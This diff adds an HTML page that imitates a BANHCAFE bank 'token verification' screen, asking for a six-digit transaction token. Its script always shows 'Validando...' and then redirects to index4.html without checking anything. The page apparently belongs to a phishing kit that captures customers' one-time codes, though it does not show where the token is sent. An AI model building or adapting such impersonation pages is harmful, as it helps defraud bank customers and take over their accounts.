@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Acceso BANHCAFE — Verificación Token</title>
+    <style>
+        :root {
+            --vino-banhcafe: #7a1c1c;
+            --fondo-claro: #f9f9f9;
+            --blanco: #ffffff;
+            --gris-link: #666; /* Color del link y cuadros */
+        }
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        body {
+            margin: 0;
+            background: var(--fondo-claro);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: linear-gradient(135deg,#f9f9f9 0%,#e6e6e6 100%);
+            padding: 40px 20px;
+            width: 100%;
+        }
+        .formulario {
+            background: var(--blanco);
+            padding: 30px 25px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.12);
+            border-top: 5px solid var(--vino-banhcafe);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            color: var(--vino-banhcafe);
+        }
+        .dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .dot {
+            width: 12px;
+            height: 12px;
+            background-color: var(--vino-banhcafe);
+            border-radius: 50%;
+        }
+        h2 {
+            margin-bottom: 10px;
+            font-size: 20px;
+            color: var(--vino-banhcafe);
+        }
+        p {
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: var(--gris-link);
+        }
+        .digit-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .digit-group input {
+            width: 48px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid var(--gris-link);
+            border-radius: 6px;
+            background: var(--blanco);
+            color: var(--gris-link);
+            outline: none; /* quita el highlight azul */
+        }
+        .digit-group input:focus {
+            border-color: var(--vino-banhcafe); /* vinotinto al seleccionar */
+            box-shadow: 0 0 5px rgba(122,28,28,0.5); /* efecto suave */
+        }
+        .validando-msg {
+            display: none;
+            color: var(--gris-link);
+            font-weight: bold;
+            margin-bottom: 10px;
+            padding: 10px;
+            background-color: #f0f0f0;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: var(--vino-banhcafe);
+            color: var(--blanco);
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #5c1414;
+        }
+        a.small-link {
+            display: block;
+            margin-top: 12px;
+            font-size: 13px;
+            color: var(--gris-link);
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <div class="formulario">
+            <div class="dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <h2>Ingresar Token</h2>
+            <p>Por favor Ingrese token de 6 dígitos para continuar con su transacción</p>
+            <form id="form-sms" autocomplete="off">
+                <div class="digit-group">
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
+                    <input type="text" maxlength="1" inputmode="numeric" pattern="\d*" />
+                </div>
+                <div id="validando-msg" class="validando-msg">Validando...</div>
+                <button type="submit">Confirmar</button>
+                <a class="small-link" href="index.html">Volver al inicio</a>
+            </form>
+        </div>
+    </div>
+    <script>
+        const inputs = document.querySelectorAll('.digit-group input');
+        const form = document.getElementById('form-sms');
+        const validandoMsg = document.getElementById('validando-msg');
+
+        // Autofocus y navegación entre inputs
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/[^0-9]/g, '').slice(0,1);
+                if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace" && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const token = Array.from(inputs).map(i => i.value).join('');
+
+            // Mostrar validando siempre después de confirmar
+            showValidandoAndRedirect();
+        });
+
+        function showValidandoAndRedirect() {
+            validandoMsg.style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "index4.html";
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
